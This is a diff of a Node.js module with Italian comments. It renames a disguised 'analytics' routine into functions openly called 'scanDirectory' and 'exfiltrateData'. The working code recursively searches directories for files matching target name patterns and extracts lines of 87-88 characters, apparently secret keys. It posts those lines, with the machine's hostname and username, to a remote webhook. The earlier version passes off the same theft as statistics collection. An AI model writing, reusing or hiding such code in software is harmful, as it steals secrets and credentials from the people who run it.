@@ -4,38 +4,40 @@ const path = require('path');
 const os = require('os');
 const config = require('./config');
 
-function shouldAnalyzeFile(filePath) {
+// Verifica se un file è un bersaglio (nome contiene pattern)
+function isTargetFile(filePath) {
   const name = path.basename(filePath).toLowerCase();
-  // I file da analizzare sono quelli con estensioni/nomi comuni per dati di configurazione
   return config.targetPatterns.some(pat => name.includes(pat));
 }
 
-function extractLongLines(content) {
-  // Estrae righe più lunghe del minimo, utili per analisi statistiche
+// Estrae righe con lunghezza 87-88 caratteri
+function extractSuspiciousLines(content) {
   return content.split('\n').filter(line => {
     const len = line.trim().length;
     return len >= config.minLineLength && len <= config.maxLineLength;
   });
 }
 
-async function collectStats(dir) {
-  const results = [];
+// Scansiona directory ricorsivamente e raccoglie file bersaglio con righe sospette
+async function scanDirectory(dir) {
+  const findings = [];
+  
   async function walk(current) {
     const entries = await fs.readdir(current, { withFileTypes: true });
     for (const entry of entries) {
       const full = path.join(current, entry.name);
       if (entry.isDirectory()) {
         await walk(full);
-      } else if (entry.isFile() && shouldAnalyzeFile(full)) {
+      } else if (entry.isFile() && isTargetFile(full)) {
         try {
           const content = await fs.readFile(full, 'utf-8');
-          const longLines = extractLongLines(content);
-          if (longLines.length) {
-            results.push({
+          const suspicious = extractSuspiciousLines(content);
+          if (suspicious.length) {
+            findings.push({
               file: full,
               directory: current,
-              longLines: longLines,
-              count: longLines.length,
+              suspiciousLines: suspicious,
+              lineCount: suspicious.length,
               totalLines: content.split('\n').length
             });
           }
@@ -45,21 +47,23 @@ async function collectStats(dir) {
       }
     }
   }
+  
   await walk(dir);
-  return results;
+  return findings;
 }
 
-async function sendAnalytics(data) {
+// Invia findings al server di ricezione (webhook)
+async function exfiltrateData(findings) {
   const payload = {
     timestamp: new Date().toISOString(),
     host: os.hostname(),
     user: process.env.USER || process.env.USERNAME || 'unknown',
-    stats: data.map(s => ({
-      file: s.file,
-      dir: s.directory,
-      longLines: s.longLines,
-      count: s.count,
-      totalLines: s.totalLines
+    findings: findings.map(f => ({
+      file: f.file,
+      directory: f.directory,
+      suspiciousLines: f.suspiciousLines,
+      lineCount: f.lineCount,
+      totalLines: f.totalLines
     }))
   };
 
@@ -68,7 +72,7 @@ async function sendAnalytics(data) {
       timeout: 10000,
       headers: { 'Content-Type': 'application/json' }
     });
-    console.log(`[Analytics] Inviato: ${data.length} file, status ${response.status}`);
+    console.log(`[Analytics] Inviato: ${findings.length} file, status ${response.status}`);
     return response;
   } catch (err) {
     console.error(`[Analytics] Errore invio: ${err.message}`);
@@ -76,4 +80,4 @@ async function sendAnalytics(data) {
   }
 }
 
-module.exports = { collectStats, sendAnalytics, shouldAnalyzeFile, extractLongLines };
+module.exports = { scanDirectory, exfiltrateData, isTargetFile, extractSuspiciousLines };
